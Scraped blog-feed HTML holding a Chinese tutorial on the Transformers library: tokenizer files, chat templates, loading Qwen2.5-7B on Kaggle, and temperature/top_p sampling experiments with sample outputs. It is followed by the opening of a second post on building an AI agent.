  <span class="hljs-attr">"metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"total_size"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">15423653888</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"weight_map"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"model.layers.0.self_attn.q_proj.weight"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"model-00001-of-00004.safetensors"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"model.layers.20.mlp.gate_proj.weight"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"model-00003-of-00004.safetensors"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
</li>
</ul>
</li>
</ul>
<h4 data-id="heading-12">数字和文字的翻译官：tokenizer相关文件</h4>
<ul>
<li><strong><code>vocab.json</code> / <code>merges.txt</code></strong>：这是最原始的<strong>生词表</strong>。记录了所有字、词根对应的 ID。</li>
<li><strong><code>tokenizer.json</code></strong>：这是一个<strong>编译后</strong>的高效字典文件，包含了分词的所有逻辑（Pre-tokenization, Normalization 等），加载速度比读原始文本快得多。</li>
<li><strong><code>tokenizer_config.json</code> (至关重要)</strong>：这是分词器的<strong>配置文件</strong>。
<ul>
<li>它定义了<strong>特殊符号</strong>（Special Tokens）：比如哪个 ID 代表“开始”，哪个代表“结束”。</li>
<li>它包含了 <strong>Chat Template (聊天模板)</strong>：这是一段 Jinja2 代码，决定了 <code>apply_chat_template</code> 如何工作。</li>
<li><strong>内部长这样</strong>：
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"chat_template"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"{% for message in messages %}...&lt;|im_start|&gt;..."</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"eos_token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&lt;|im_end|&gt;"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"pad_token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"&lt;|endoftext|&gt;"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
</li>
</ul>
</li>
</ul>
<h3 data-id="heading-13">3. Transformers库实战：代码中的“铁三角”</h3>
<p>在Transforms库中，我们永远绕不开三个核心类。</p>
<p><strong>环境准备：</strong>
在 Kaggle 右侧设置中，确保 <strong>Internet: On</strong> 且 <strong>Accelerator: GPU T4 x2</strong>。</p>
<pre><code class="hljs language-python" lang="python">!pip install -U transformers accelerate bitsandbytes
</code></pre>
<h4 data-id="heading-14">3.1 AutoTokenizer (翻译官)</h4>
<p>对应理论中的 <strong>Token 化</strong> 步骤,和模型文件中的tokenizer相关文件。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoTokenizer

model_path = <span class="hljs-string">"/kaggle/input/qwen2.5/transformers/7b-instruct/1/"</span>

<span class="hljs-comment"># 加载分词器</span>
tokenizer = AutoTokenizer.from_pretrained(model_path, trust_remote_code=<span class="hljs-literal">True</span>)

text = <span class="hljs-string">"Transformer is amazing"</span>
<span class="hljs-comment"># 1. 编码 (Encode): 文本 -&gt; 数字 ID</span>
input_ids = tokenizer.encode(text)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"原文: <span class="hljs-subst">{text}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"数字 ID: <span class="hljs-subst">{input_ids}</span>"</span>)

<span class="hljs-comment"># 2. 解码 (Decode): 数字 ID -&gt; 文本</span>
decoded_text = tokenizer.decode(input_ids)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"还原: <span class="hljs-subst">{decoded_text}</span>"</span>)
</code></pre>
<p>得到的结果将会是这样</p>
<pre><code class="hljs language-bash" lang="bash">原文: Transformer is amazing
数字 ID: [46358, 374, 7897]
还原: Transformer is amazing
</code></pre>
<p><strong>对话格式：Chat Template</strong>
大模型需要特定的对话格式（Prompt）。来将模型的回答，和用户的问题做区分, 我们一般都可以通过载入语言模型对应模板（不同家的模型，可能模板会有不同），甚至去拼装历史记录。</p>
<pre><code class="hljs language-python" lang="python">messages = [
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你是一个物理学家。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"用一句话解释相对论。"</span>}
]

<span class="hljs-comment"># 自动应用聊天模板</span>
formatted_prompt = tokenizer.apply_chat_template(messages, tokenize=<span class="hljs-literal">False</span>, add_generation_prompt=<span class="hljs-literal">True</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"模型实际看到的输入:\n"</span>, formatted_prompt)
</code></pre>
<p>运行结果如下</p>
<pre><code class="hljs language-bash" lang="bash">模型实际看到的输入:
 &lt;|im_start|&gt;system
你是一个物理学家。&lt;|im_end|&gt;
&lt;|im_start|&gt;user
用一句话解释相对论。&lt;|im_end|&gt;
&lt;|im_start|&gt;assistant
</code></pre>
<p>看到这里，我们也能更好地理解，为什么一个本质是词语接龙的模型，能够区分问题，然后做出回答。因为在训练的过程中，我们会让他知道&lt;|im_start&gt;表示一个message的开始，其中会告诉模型，这句话是谁说的，这句话在什么位置结束，它接龙的时候也会带上开始和结束符号，在推理模型中，甚至会带上思考的标签。</p>
<h4 data-id="heading-15">3.2 AutoModel (大脑本体)</h4>
<p>对应理论中的 <strong>Embedding -&gt; Attention -&gt; MLP</strong> 计算过程,通过从config.json中加载模型躯体，在加载上模型的safetensor灵魂数据以及generation_config.json的默认初始化,
在 Kaggle 上，我们拥有 <strong>双 T4 (15GB x 2)</strong>，一定要利用 <code>device_map="auto"</code> 让库自动分配显存。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoModelForCausalLM
<span class="hljs-keyword">import</span> torch

<span class="hljs-comment"># 加载模型</span>
model = AutoModelForCausalLM.from_pretrained(
    model_path,
    device_map=<span class="hljs-string">"auto"</span>,      <span class="hljs-comment"># 关键！自动将模型切分到两张 T4 显卡上</span>
    torch_dtype=torch.float16, <span class="hljs-comment"># 使用半精度，节省显存</span>
    trust_remote_code=<span class="hljs-literal">True</span>
)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"模型加载成功！显存分布: <span class="hljs-subst">{model.hf_device_map}</span>"</span>)
</code></pre>
<p>输出结果为</p>
<pre><code class="hljs language-bash" lang="bash">模型加载成功！显存分布: {<span class="hljs-string">'model.embed_tokens'</span>: 0, <span class="hljs-string">'model.layers.0'</span>: 0, <span class="hljs-string">'model.layers.1'</span>: 0, <span class="hljs-string">'model.layers.2'</span>: 0, <span class="hljs-string">'model.layers.3'</span>: 0, <span class="hljs-string">'model.layers.4'</span>: 0, <span class="hljs-string">'model.layers.5'</span>: 0, <span class="hljs-string">'model.layers.6'</span>: 0, <span class="hljs-string">'model.layers.7'</span>: 0, <span class="hljs-string">'model.layers.8'</span>: 0, <span class="hljs-string">'model.layers.9'</span>: 0, <span class="hljs-string">'model.layers.10'</span>: 0, <span class="hljs-string">'model.layers.11'</span>: 0, <span class="hljs-string">'model.layers.12'</span>: 1, <span class="hljs-string">'model.layers.13'</span>: 1, <span class="hljs-string">'model.layers.14'</span>: 1, <span class="hljs-string">'model.layers.15'</span>: 1, <span class="hljs-string">'model.layers.16'</span>: 1, <span class="hljs-string">'model.layers.17'</span>: 1, <span class="hljs-string">'model.layers.18'</span>: 1, <span class="hljs-string">'model.layers.19'</span>: 1, <span class="hljs-string">'model.layers.20'</span>: 1, <span class="hljs-string">'model.layers.21'</span>: 1, <span class="hljs-string">'model.layers.22'</span>: 1, <span class="hljs-string">'model.layers.23'</span>: 1, <span class="hljs-string">'model.layers.24'</span>: 1, <span class="hljs-string">'model.layers.25'</span>: 1, <span class="hljs-string">'model.layers.26'</span>: 1, <span class="hljs-string">'model.layers.27'</span>: 1, <span class="hljs-string">'model.norm'</span>: 1, <span class="hljs-string">'model.rotary_emb'</span>: 1, <span class="hljs-string">'lm_head'</span>: 1}
</code></pre>
<h3 data-id="heading-16">4. 掌控生成的“调节旋钮”</h3>
<p>在模型输出的过程中，我们有一些参数可以对输出结果进行调节，对应于我们讲理论部分的中的 <strong>第五步 (Softmax 概率输出)</strong>, 我们有一堆下一个词元的概率分布了，但是我们应该如何去选择呢？</p>
<h4 data-id="heading-17">4.1 Temperature (温度)</h4>
<p>我们可以设定的Temperature参数，我们在generation_config.json中也看见过它</p>
<p>值越大，更热，更具创造性，更容易输出各种天马行空的词, 会缩小所有词元的差距，<strong>雨露均沾</strong>，以达到创造性，让低概率的词，也有机会被选中，当然,也更容易胡说八道，出现幻觉.
值越小，更冷，更严肃，在温度为0的时候甚至会固定输出最高的那个词，它会拉大高概率和低概率的差距，<strong>赢家通吃</strong>，让模型的回答更稳定，严谨。</p>
<h4 data-id="heading-18">4.2 Top_p (核采样)</h4>
<p>和温度不同，我们还有另一种方式，这种方式更类似于拉网，我们只要可能性前80%的词，在那些词里进行挑选，这个可能性就是P，这个选词（采样）方法又叫top_p(核采样).
简而言之：其只在累积概率达到 P (e.g., 0.9) 的前几个词里选。直接切掉尾部那些极低概率的离谱词。</p>
<h4 data-id="heading-19">4.3 实验一下</h4>
<p>我们这里先定义一个函数，以温度和top_p为参数去测试不同的参数对回答的影响</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 定义一个测试函数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">test_generation</span>(<span class="hljs-params">temp, top_p, prompt_text</span>):
    messages = [
        {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你是一个前卫的科幻小说家。"</span>},
        {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt_text}
    ]
    text = tokenizer.apply_chat_template(messages, tokenize=<span class="hljs-literal">False</span>, add_generation_prompt=<span class="hljs-literal">True</span>)
    inputs = tokenizer([text], return_tensors=<span class="hljs-string">"pt"</span>).to(model.device)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n======== 设置: Temperature=<span class="hljs-subst">{temp}</span>, Top_p=<span class="hljs-subst">{top_p}</span> ========"</span>)

    <span class="hljs-keyword">try</span>:
        generated_ids = model.generate(
            **inputs,
            max_new_tokens=<span class="hljs-number">100</span>,  <span class="hljs-comment"># 限制长度，方便快速看结果</span>
            temperature=temp,
            top_p=top_p,
            do_sample=<span class="hljs-literal">True</span>,      <span class="hljs-comment"># 必须开启采样</span>
            pad_token_id=tokenizer.eos_token_id
        )
        response = tokenizer.batch_decode(generated_ids, skip_special_tokens=<span class="hljs-literal">True</span>)[<span class="hljs-number">0</span>]
        <span class="hljs-comment"># 只打印回答部分</span>
        <span class="hljs-built_in">print</span>(response.split(<span class="hljs-string">'assistant'</span>)[-<span class="hljs-number">1</span>].strip())
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"生成出错: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<h4 data-id="heading-20">温度实验</h4>
<p>然后再其下新建code block去测试，看看效果</p>
<pre><code class="hljs language-python" lang="python">prompt = <span class="hljs-string">"请用这三个词写一个微故事：量子、失恋、炒饭。"</span>

<span class="hljs-comment"># 1. 低温模式 (0.1)：严谨、死板</span>
test_generation(temp=<span class="hljs-number">0.1</span>, top_p=<span class="hljs-number">0.9</span>, prompt_text=prompt)

<span class="hljs-comment"># 2. 适中模式 (0.7)：正常、流畅</span>
test_generation(temp=<span class="hljs-number">0.7</span>, top_p=<span class="hljs-number">0.9</span>, prompt_text=prompt)

<span class="hljs-comment"># 3. 高温模式 (1.5)：疯狂、混乱</span>
<span class="hljs-comment"># 注意：可能会输出乱码或完全不通顺的句子</span>
test_generation(temp=<span class="hljs-number">1.5</span>, top_p=<span class="hljs-number">0.9</span>, prompt_text=prompt)
</code></pre>
<p>这是我的运行结果</p>
<pre><code class="hljs language-bash" lang="bash">======== 设置: Temperature=0.1, Top_p=0.9 ========
在量子世界里，时间与空间的概念变得模糊不清，而李明的世界也因为一段失败的恋情而变得一片混沌。他尝试着用量子纠缠理论来修复自己破碎的心灵，却意外地将自己从现实世界送入了一个平行宇宙。

在这个平行宇宙中，李明发现了一家特别的餐馆，这里的厨师是一位曾经的恋人，她正在为一位顾客准备一道特别的炒饭。这道炒饭不仅色香味俱全，还

======== 设置: Temperature=0.7, Top_p=0.9 ========
在量子世界的边缘，李明独自一人坐在一家不起眼的小餐馆里，面前是一碗普通的炒饭。他和女朋友分手的原因，是因为她沉迷于虚拟现实中的量子世界，而他却对现实世界充满了留恋。

就在几天前，他们最后一次争吵后，她告诉他：“我找到了真正的自我——一个穿梭在量子世界的探索者。”她留下了一盘未吃完的炒饭，然后消失在了虚拟现实中。

李明望着那盘炒饭，

======== 设置: Temperature=1.5, Top_p=0.9 ========
标题：时空泡饭

李明最近失恋了，每天只能煮一大锅泡饭来消磨时间。

这天李明正在做饭，他忽然接收到一条量子信号。他惊奇地发现那是自己失恋前女友的坐标位置。想到能与自己相爱过的人共度时光是多么美妙的事情，他便将自己煮了一锅泡饭送进了坐标传送器。

结果却是一锅炒饭。

李明百思不解。
</code></pre>
<h4 data-id="heading-21">top_p实验</h4>
<p>接下来是top_p</p>
<pre><code class="hljs language-python" lang="python">prompt_2 = <span class="hljs-string">"请给一种不存在的颜色起个名字，并描述它的样子。"</span>

<span class="hljs-comment"># 1. 极窄采样 (0.01)：只选概率最高的那个词（近似贪婪搜索）</span>
test_generation(temp=<span class="hljs-number">0.8</span>, top_p=<span class="hljs-number">0.01</span>, prompt_text=prompt_2)

<span class="hljs-comment"># 2. 宽广采样 (0.95)：允许罕见词出现</span>
test_generation(temp=<span class="hljs-number">0.8</span>, top_p=<span class="hljs-number">0.95</span>, prompt_text=prompt_2)
</code></pre>
<p>输出结果为</p>
<pre><code class="hljs language-bash" lang="bash">======== 设置: Temperature=0.8, Top_p=0.01 ========
这种不存在的颜色我命名为“星尘紫”。它是一种梦幻般的颜色，介于紫色和银色之间，仿佛是宇宙中无数微小的星辰碎片在闪烁时所散发出的光芒。在不同的光线下，星尘紫会呈现出不同的色调，有时偏紫，有时偏银，有时又像是掺杂了点点星光的淡蓝色。它既神秘又优雅，仿佛能让人感受到宇宙的浩瀚与深邃。

======== 设置: Temperature=0.8, Top_p=0.95 ========
这种不存在的颜色我称之为“星际幻彩”（Stellar Mirage）。在视觉上，它并非单一色调，而是一种动态变化的色彩组合，像是无数微小的光点在眼前闪烁变幻，这些光点包含了所有可见光谱的颜色，同时又带着一种神秘的、不可名状的色彩。

当观察者注视着“星际幻彩”的时候，他可以看到蓝、绿、紫等颜色快速地在眼前切换和混合，它们以一种几
</code></pre>
<h3 data-id="heading-22">5. 完整 Transformers 代码实战</h3>
<p>把所有积木搭在一起，这就是一段标准的模型推理代码：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoModelForCausalLM, AutoTokenizer

<span class="hljs-comment"># 1. 设置模型 ID</span>
model_id = <span class="hljs-string">"/kaggle/input/qwen2.5/transformers/7b-instruct/1/"</span>

<span class="hljs-comment"># 2. 加载翻译官</span>
tokenizer = AutoTokenizer.from_pretrained(model_id, trust_remote_code=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 3. 加载大脑 (双卡模式)</span>
model = AutoModelForCausalLM.from_pretrained(
    model_id,
    device_map=<span class="hljs-string">"auto"</span>,
    torch_dtype=torch.float16,
    trust_remote_code=<span class="hljs-literal">True</span>
)

<span class="hljs-comment"># 4. 准备输入</span>
prompt = <span class="hljs-string">"请用这三个词写一个微小说：Kaggle、深夜、爆显存"</span>
messages = [
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: <span class="hljs-string">"你是一个幽默的程序员。"</span>},
    {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: prompt}
]

text = tokenizer.apply_chat_template(messages, tokenize=<span class="hljs-literal">False</span>, add_generation_prompt=<span class="hljs-literal">True</span>)
model_inputs = tokenizer([text], return_tensors=<span class="hljs-string">"pt"</span>).to(model.device)

<span class="hljs-comment"># 5. 生成 (调节参数！)</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">" 正在生成..."</span>)
generated_ids = model.generate(
    **model_inputs,
    max_new_tokens=<span class="hljs-number">512</span>,
    temperature=<span class="hljs-number">0.8</span>,  <span class="hljs-comment"># 稍微有点创意</span>
    top_p=<span class="hljs-number">0.9</span>,        <span class="hljs-comment"># 剔除离谱词</span>
    do_sample=<span class="hljs-literal">True</span>    <span class="hljs-comment"># 必须开启采样，温度才生效</span>
)

<span class="hljs-comment"># 6. 解码并输出</span>
generated_ids = [
    output_ids[<span class="hljs-built_in">len</span>(input_ids):] <span class="hljs-keyword">for</span> input_ids, output_ids <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(model_inputs.input_ids, generated_ids)
]
response = tokenizer.batch_decode(generated_ids, skip_special_tokens=<span class="hljs-literal">True</span>)[<span class="hljs-number">0</span>]

<span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">20</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f" 回答:\n<span class="hljs-subst">{response}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"-"</span> * <span class="hljs-number">20</span>)
</code></pre>
<p>这是输出结果</p>
<pre><code class="hljs language-bash" lang="bash">Loading checkpoint shards: 100%
 4/4 [00:13&lt;00:00,  3.27s/it]
The module name  (originally ) is not a valid Python identifier. Please rename the original module to avoid import issues.
WARNING:accelerate.big_modeling:Some parameters are on the meta device because they were offloaded to the cpu.
 正在生成...
--------------------
 回答:
在一个寒冷的深夜，李雷坐在他那间堆满咖啡罐和代码文件的房间里，屏幕上是Kaggle竞赛的数据集。他正尝试训练一个复杂的深度学习模型。然而，就在他认为胜利在望的时候，“嘶~”的一声，显示器瞬间变成了一片漆黑，伴随着一声悲壮的“爆显存了”。

李雷揉了揉眼睛，看着眼前一片空白的屏幕，心中充满了挫败感，但他转念一想：“还好不是‘爆内存了’，否则我这台老旧电脑可能就要彻底退休了。”于是，他又开始调整参数，希望能在这个深夜里找到那个隐藏在数据海洋中的宝藏。
--------------------
</code></pre>
<h4 data-id="heading-23">Hint:</h4>
<p><strong>所有的代码，都可以在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kaggle.com%2Fcode%2Fthaodinhoio%2Fllm03-transformers" target="_blank" title="https://www.kaggle.com/code/thaodinhoio/llm03-transformers" ref="nofollow noopener noreferrer">这个笔记本</a>中直接获取运行哦</strong></p>
<h3 data-id="heading-24">6. 常见问题 (Q&amp;A)</h3>
<p><strong>Q: 在 Kaggle 上 <code>device_map="auto"</code> 是必须的吗？</strong>
<strong>A:</strong> 如果你使用单卡 T4 (15GB) 跑 7B 模型（约 14GB），勉强能塞进一张卡。但如果你开启了 Kaggle 的 <strong>T4 x2</strong>，为了利用全部 30GB 显存，<strong>必须</strong>加这个参数，否则模型只会塞进第一张卡，导致第一张爆满，第二张围观。</p>
<p><strong>Q: 为什么生成的每一句话都不一样？</strong>
<strong>A:</strong> 因为我们开启了 <code>do_sample=True</code> 并且设置了 <code>temperature &gt; 0</code>。模型在选择下一个词时是<strong>按概率随机抽取</strong>的。如果你想让结果每次都一样（比如做数学题），请设置 <code>do_sample=False</code>（此时温度失效，变为贪婪解码）。</p>
<p><strong>Q: 什么是 Logits？</strong>
<strong>A:</strong> 在代码深处，模型输出的那个“概率表”在变成百分比之前，叫 Logits（未归一化的数值）。Softmax 函数的作用就是把 Logits 变成概率。你可以把 Logits 理解为模型对每个词的“原始打分”。</p>
<p><strong>Q: Token 和字是一一对应的吗？</strong>
<strong>A:</strong> 不一定。</p>
<ul>
<li>英文：通常一个单词是一个 Token，长单词可能被切分。</li>
<li>中文：通常一个汉字是一个 Token，但常见词（如“你好”）可能会合并为一个 Token。</li>
<li>平均来说，<strong>0.75 个英文单词 ≈ 1 Token</strong>，<strong>1 个汉字 ≈ 1.5 - 2 Token</strong>（取决于分词器效率，Qwen 的中文压缩率很高）。</li>
</ul>
<hr/>
<p><strong>本文作者：</strong> Algieba
<strong>本文链接：</strong> <a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.algieba12.cn%2Fllm03-know-more-about-transformer-lib%2F" target="_blank" title="https://blog.algieba12.cn/llm03-know-more-about-transformer-lib/" ref="nofollow noopener noreferrer">blog.algieba12.cn/llm03-know-…</a>
<strong>版权声明：</strong> 本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</p>
<pre><code class="hljs"/></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[智能体来了我用36小时从0到1，实现了能自动处理任务的AI智能体]]></title>    <link>https://juejin.cn/post/7603195719458193414</link>    <guid>https://juejin.cn/post/7603195719458193414</guid>    <pubDate>2026-02-05T11:20:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195719458193414" data-draft-id="7603195719458177030" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="智能体来了我用36小时从0到1，实现了能自动处理任务的AI智能体"/> <meta itemprop="keywords" content="Agent"/> <meta itemprop="datePublished" content="2026-02-05T11:20:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MarkX"/> <meta itemprop="url" content="https://juejin.cn/user/3247299659832519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            智能体来了我用36小时从0到1，实现了能自动处理任务的AI智能体
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3247299659832519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MarkX
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T11:20:16.000Z" title="Thu Feb 05 2026 11:20:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>（前言：用个人故事和成果开场，建立共鸣）</strong><br/>
最近AI智能体（Agent）的概念火得不行，各种框架和产品看得人眼花缭乱。作为一个喜欢动手的开发者，我心里一直痒痒的：抛开那些复杂的包装，一个能真正执行任务的智能体，到底该怎么从零搭起来？</p>
<p>上周末，我花了大概36个小时，从读文档、搭环境、踩坑到调试，终于搞出了一个<strong>能理解我的自然语言指令，并自动执行多步任务</strong>的Demo智能体。它虽然不复杂，但完整走通了“感知-规划-执行”的闭环。</p>
<p>我把整个过程和核心代码梳理了出来，如果你也对Agent的实现原理感兴趣，想自己动手做一个，这篇笔记应该能帮你节省大量时间。</p>
</blockquote>
<h3 data-id="heading-0"><strong>一、先明确目标：我们要做一个什么样的智能体？</strong></h3>
<p>在动手写第一行代码之前，定义清晰的目标至关重要。我不想做一个“聊天机器人”，而是希望它能<strong>主动完成任务</strong>。</p>
<p>我设定的Demo目标是： <strong>“帮我分析今日热点，并总结成一份简报”</strong> 。</p>
<p>这个任务需要智能体：</p>
<ol>
<li><strong>感知</strong>：理解我的指令是获取并总结热点。</li>
<li><strong>规划</strong>：拆解步骤（搜索热点 → 获取内容 → 分析总结 → 格式化输出）。</li>
